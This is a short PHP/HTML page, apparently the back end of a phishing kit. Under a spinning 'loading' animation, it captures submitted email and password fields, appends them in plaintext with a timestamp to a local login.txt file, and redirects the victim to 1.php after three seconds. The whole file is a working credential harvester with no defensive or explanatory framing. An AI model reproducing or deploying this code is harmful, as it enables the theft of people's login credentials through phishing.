<html>
<head>
<style>
  body {
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
    background-color: #f0f0f0;
  }

  .loader {
    border: 6px solid #3498db;
    border-top: 6px solid #ffffff;
    border-radius: 50%;
    width: 100px; /* Aumentei o tamanho do círculo */
    height: 100px; /* Aumentei o tamanho do círculo */
    animation: spin 2s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>
</head>
<body>
<div class="loader"></div>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["pass"];
    $currentDateTime = date('Y-m-d H:i:s');
    
    // Dados a serem salvos
    $dataToSave = "Data e Hora: $currentDateTime\n";
    $dataToSave .= "Email: $email\n";
    $dataToSave .= "Senha: $password\n\n";
    
    // Caminho para o arquivo de log
    $logFilePath = "login.txt";
    
    // Salvar os dados no arquivo de log
    file_put_contents($logFilePath, $dataToSave, FILE_APPEND);
    
    // Redirecionar para 1.php após salvar os dados
    echo '<script>';
    echo 'setTimeout(function () { window.location.href = "1.php"; }, 3000);'; // Redireciona após 3 segundos
    echo '</script>';
}
?>

</body>
</html>